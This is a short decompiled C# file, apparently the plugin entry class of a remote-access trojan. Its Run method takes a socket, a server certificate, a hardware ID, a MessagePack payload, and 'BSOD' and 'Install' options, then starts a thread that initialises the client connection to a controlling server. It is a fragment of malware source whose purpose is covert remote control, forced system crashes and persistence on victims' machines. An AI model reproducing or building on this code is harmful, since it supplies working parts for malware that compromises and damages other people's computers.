using System;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Plugin
{
	// Token: 0x0200002D RID: 45
	public class Plugin
	{
		// Token: 0x060000D1 RID: 209 RVA: 0x0000807C File Offset: 0x0000627C
		public void Run(Socket socket, X509Certificate2 certificate, string hwid, byte[] msgPack, Mutex mutex, string mtx, string bsod, string install)
		{
			Plugin.AppMutex = mutex;
			Plugin.Mutex = mtx;
			Plugin.BSOD = bsod;
			Plugin.Install = install;
			Plugin.Socket = socket;
			Connection.ServerCertificate = certificate;
			Connection.Hwid = hwid;
			new Thread(delegate
			{
				Connection.InitializeClient(msgPack);
			}).Start();
			while (Connection.IsConnected)
			{
				Thread.Sleep(1000);
			}
		}

		// Token: 0x04000080 RID: 128
		public static Socket Socket;

		// Token: 0x04000081 RID: 129
		public static Mutex AppMutex;

		// Token: 0x04000082 RID: 130
		public static string Mutex;

		// Token: 0x04000083 RID: 131
		public static string BSOD;

		// Token: 0x04000084 RID: 132
		public static string Install;

		// Token: 0x04000085 RID: 133
		public static string InstallFile;
	}
}
